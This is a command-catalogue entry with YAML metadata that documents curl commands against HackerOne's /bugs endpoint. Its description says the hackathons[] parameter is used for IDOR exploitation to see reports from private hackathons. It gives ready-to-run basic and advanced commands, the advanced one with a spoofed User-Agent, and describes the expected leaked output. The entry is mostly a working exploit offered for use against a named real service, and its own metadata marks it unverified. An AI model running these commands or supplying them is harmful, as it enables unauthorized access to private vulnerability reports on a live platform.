---
id: cmd-curl-hackerone-bugs
data: >-
  curl
  "https://hackerone.com/bugs?subject=security&hackathons[]=28&hackathons[]=999"
  -o filtered_bugs.html
tags:
  - web
  - recon
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.532Z'
verified: false
validated: true
submitted: true
---
# curl-query-hackerone-bugs

## Command

```bash
curl "https://hackerone.com/bugs?subject=security&hackathons[]=28&hackathons[]=999" -o filtered_bugs.html
```

## Description

This command uses curl to query the HackerOne /bugs endpoint with filters, including the hackathons[] parameter for IDOR exploitation, saving the response for analysis of bug report submission dates.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--subject=security` | Filters reports by subject (e.g., security) | No |
| `hackathons[]=<ID>` | Array of hackathon IDs to filter by; supports private IDs via IDOR | Yes |
| `-o <file>` | Output file for response | Yes |

## Examples

### Basic Usage

```bash
curl "https://hackerone.com/bugs?subject=security" -o bugs.html
```

### Advanced Usage

```bash
curl "https://hackerone.com/bugs?subject=security&hackathons[]=28&hackathons[]=999&hackathons[]=1000" -o multi_filter.html --header "User-Agent: Mozilla/5.0"
```

## Expected Output

HTML response containing filtered bug reports with submission dates visible in elements like <span class="date">YYYY-MM-DD</span>. No errors for unauthorized hackathon IDs due to IDOR.

## Related

- [[Related Procedure: Exploit IDOR in HackerOne Bugs Hackathons Parameter]]
